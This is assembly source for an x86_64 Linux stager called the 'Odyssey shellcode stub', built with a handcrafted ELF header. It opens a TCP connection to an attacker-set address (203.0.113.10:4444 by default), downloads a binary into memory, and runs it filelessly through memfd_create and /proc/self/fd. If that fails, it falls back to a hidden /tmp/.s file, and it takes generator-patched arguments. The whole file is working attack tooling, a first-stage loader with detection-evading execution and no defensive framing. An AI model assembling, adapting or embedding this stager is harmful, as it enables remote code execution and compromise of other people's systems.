; Odyssey shellcode stub - x86_64 Linux
; Downloads binary from stager-server (no-auth, raw) and executes via:
;   1. memfd_create + execve  (fileless)
;   2. /tmp/.s fallback       (disk)
;
; IP:PORT and ARGS are patched at known offsets
; Assemble: nasm -f bin -o stub_linux_x64_elf stub_linux.asm

BITS 64
ORG 0x400000

; ── ELF64 header ────────────────────────────────────────────────
ehdr:
    db 0x7f, "ELF"
    db 2                    ; EI_CLASS = 64-bit
    db 1                    ; EI_DATA = little-endian
    db 1                    ; EI_VERSION
    db 0                    ; EI_OSABI
    dq 0                    ; padding
    dw 2                    ; e_type = ET_EXEC
    dw 0x3e                 ; e_machine = EM_X86_64
    dd 1                    ; e_version
    dq _start              ; e_entry
    dq phdr - ehdr         ; e_phoff
    dq 0                    ; e_shoff
    dd 0                    ; e_flags
    dw ehdr_size            ; e_ehsize
    dw phdr_size            ; e_phentsize
    dw 1                    ; e_phnum
    dw 0, 0, 0
ehdr_size equ $ - ehdr

; ── Program header ──────────────────────────────────────────────
phdr:
    dd 1                    ; PT_LOAD
    dd 7                    ; PF_R|PF_W|PF_X
    dq 0
    dq 0x400000
    dq 0x400000
    dq file_size
    dq file_size + 0x10000 ; 64KB extra for stack/recv
    dq 0x1000
phdr_size equ $ - phdr

; ── Patchable data ──────────────────────────────────────────────
PATCH_IP:
    db 203, 0, 113, 10     ; 4 bytes, patched by generator
PATCH_PORT:
    db 0x11, 0x5C           ; 2 bytes big-endian = 4444

PATCH_ARGS:
    db "ODYARGS!"           ; 8-byte sentinel, generator replaces all 256 bytes
    times 248 db 0           ; total 256 bytes, null-separated args

; ── Fixed data ──────────────────────────────────────────────────
sockaddr:
    dw 2                    ; AF_INET
.port:  dw 0
.addr:  dd 0
    dq 0                    ; padding

memfd_name:
    db 0

fallback_path:
    db "/tmp/.s", 0

proc_fd_prefix:
    db "/proc/self/fd/", 0

; ── Code ────────────────────────────────────────────────────────
_start:
    movzx eax, word [PATCH_PORT]
    mov [sockaddr.port], ax
    mov eax, [PATCH_IP]
    mov [sockaddr.addr], eax

    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov eax, 41
    mov edi, 2
    mov esi, 1
    xor edx, edx
    syscall
    test eax, eax
    js .exit_fail
    mov r12d, eax

    ; connect(sock_fd, &sockaddr, 16)
    mov eax, 42
    mov edi, r12d
    lea rsi, [sockaddr]
    mov edx, 16
    syscall
    test eax, eax
    jnz .exit_fail

    ; mmap(NULL, 64MB, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    mov eax, 9
    xor edi, edi
    mov esi, 0x4000000
    mov edx, 3
    mov r10d, 0x22
    mov r8d, -1
    xor r9d, r9d
    syscall
    cmp rax, -1
    je .exit_fail
    mov r13, rax
    xor r14d, r14d

.recv_loop:
    xor eax, eax            ; __NR_read
    mov edi, r12d
    lea rsi, [r13 + r14]
    mov edx, 65536
    syscall
    test eax, eax
    jle .recv_done
    add r14d, eax
    jmp .recv_loop

.recv_done:
    mov eax, 3               ; close(sock_fd)
    mov edi, r12d
    syscall

    ; ── Try memfd_create ────────────────────────────────────────
    mov eax, 319
    lea rdi, [memfd_name]
    xor esi, esi
    syscall
    test eax, eax
    js .try_file_fallback
    mov r15d, eax

    ; write(memfd, buffer, total_len)
    mov eax, 1
    mov edi, r15d
    mov rsi, r13
    mov edx, r14d
    syscall

    ; Build "/proc/self/fd/N" string on stack
    sub rsp, 32
    mov rdi, rsp
    lea rsi, [proc_fd_prefix]
.copy_prefix:
    lodsb
    stosb
    test al, al
    jnz .copy_prefix
    dec rdi

    ; itoa(r15d) into rdi
    mov eax, r15d
    xor ecx, ecx
.itoa_push:
    xor edx, edx
    mov ebx, 10
    div ebx
    add dl, '0'
    push rdx
    inc ecx
    test eax, eax
    jnz .itoa_push
.itoa_pop:
    pop rdx
    mov [rdi], dl
    inc rdi
    dec ecx
    jnz .itoa_pop
    mov byte [rdi], 0

    ; execve with patched args
    mov rdi, rsp
    call exec_with_args
    ; execve failed, clean up
    add rsp, 32
    mov eax, 3
    mov edi, r15d
    syscall

.try_file_fallback:
    ; open("/tmp/.s", O_WRONLY|O_CREAT|O_TRUNC, 0755)
    mov eax, 2
    lea rdi, [fallback_path]
    mov esi, 0x241
    mov edx, 0o755
    syscall
    test eax, eax
    js .exit_fail
    mov r15d, eax

    ; write(fd, buffer, total_len)
    mov eax, 1
    mov edi, r15d
    mov rsi, r13
    mov edx, r14d
    syscall

    ; close(fd)
    mov eax, 3
    mov edi, r15d
    syscall

    ; execve with patched args
    lea rdi, [fallback_path]
    call exec_with_args

.exit_fail:
    mov eax, 60
    mov edi, 1
    syscall

; ── Helper: build argv from PATCH_ARGS and execve ──────────────
; Input: rdi = path to execute
; Uses PATCH_ARGS as null-separated arg strings (empty = no args)
; Returns only if execve fails
exec_with_args:
    sub rsp, 264             ; argv array: 33 slots * 8 bytes
    mov [rsp], rdi           ; argv[0] = path

    lea rsi, [PATCH_ARGS]
    mov ecx, 1               ; next argv index

    cmp byte [rsi], 0
    je .ewa_done

.ewa_loop:
    mov [rsp + rcx*8], rsi   ; argv[n] = pointer to arg string
    inc ecx
    cmp ecx, 32
    jge .ewa_done             ; max 31 args + path + NULL
.ewa_skip:
    inc rsi
    cmp byte [rsi], 0
    jne .ewa_skip
    inc rsi                   ; skip null terminator
    cmp byte [rsi], 0
    jne .ewa_loop             ; next arg unless double-null

.ewa_done:
    xor eax, eax
    mov [rsp + rcx*8], rax   ; NULL terminator
    mov rsi, rsp             ; argv
    xor edx, edx             ; envp = NULL
    mov eax, 59              ; __NR_execve
    syscall
    add rsp, 264
    ret

file_size equ $ - ehdr
